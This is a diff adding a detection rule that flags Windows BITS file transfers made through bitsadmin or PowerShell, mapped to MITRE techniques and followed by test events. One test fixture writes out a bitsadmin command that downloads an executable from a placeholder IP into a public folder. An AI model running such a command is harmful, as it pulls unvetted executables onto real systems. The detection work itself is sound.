@@ -1,0 +1,39 @@
+[rule]
+id = "etap-017"
+name = "BITS Job Used to Transfer a File"
+description = "A background transfer job created with bitsadmin or PowerShell, used to pull files down quietly."
+version = "1"
+author = "E-TAP team"
+license = "MIT"
+os_list = ["windows"]
+query = '''process where
+  (process.name in~ ("bitsadmin.exe") and process.command_line : ("/transfer", "/create", "/addfile", "/setnotifycmdline"))
+  or (process.name in~ ("powershell.exe", "pwsh.exe") and process.command_line : "Start-BitsTransfer")
+'''
+
+[[threat]]
+tactic.name = "Defense Evasion"
+[[threat.technique]]
+id = "T1197"
+name = "BITS Jobs"
+
+[[threat]]
+tactic.name = "Command and Control"
+[[threat.technique]]
+id = "T1105"
+name = "Ingress Tool Transfer"
+
+[[tests]]
+name = "bitsadmin"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "bitsadmin.exe", executable = "C:\\Windows\\System32\\bitsadmin.exe", command_line = "bitsadmin /transfer j http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe" } }
+
+[[tests]]
+name = "powershell"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "powershell.exe", executable = "C:\\Windows\\System32\\powershell.exe", command_line = "powershell Start-BitsTransfer -Source http://x -Destination y" } }
+
+[[tests]]
+name = "list jobs"
+expect = "no_match"
+event = { _category = "process", event = { action = "start" }, process = { name = "bitsadmin.exe", executable = "C:\\Windows\\System32\\bitsadmin.exe", command_line = "bitsadmin /list" } }
